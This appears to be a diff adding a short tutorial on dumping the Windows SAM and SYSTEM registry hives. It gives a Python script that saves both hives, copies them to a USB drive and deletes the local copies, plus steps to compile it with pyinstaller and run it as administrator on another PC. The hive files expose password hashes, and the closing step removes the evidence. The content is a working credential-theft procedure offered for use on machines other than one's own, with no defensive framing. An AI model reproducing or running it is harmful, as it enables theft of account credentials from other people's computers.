@@ -1,0 +1,38 @@
+faster way to get sam and system file
+
+level: 1.5
+
+Requirement:
+- window os
+- python on window (for scripting)
+- python pakage: pyinstaller (turn python scipt into exe file in order to run on window)
+- usb flash drive
+
+Installation
+- install python from python.org
+- python pakage:
+in window terminal: pip install pyinstaller
+
+Process:
+1. scipting:
+import os
+cmd = [
+        'reg save HKLM\sam ./sam.save',
+        'reg save HKLM\system ./sys.save',
+        'copy sam.save T:', # replace T: with usb flash drive name. better with name other than C:, D:, F:
+        'copy sys.save T:',
+        'del sam.save',
+        'del sys.save'
+        ]
+for i in cmd:
+    os.system(i)
+2. convert python script file into exe file:
+- in window terminal cd into local of scipt file:
+mkdir foldername (create folder to contain scipt file)
+move filename.py foldername
+cd foldername
+pyinstaller filename.py
+- copy foldername to flash drive
+3. insert flash drive on other pc and move foldername to Desktop and open foldername then open disk folder after that run test.exe as admistrator. make sure to delete foldername in Desktop after finish run script
+
+last update: 2023.11.06
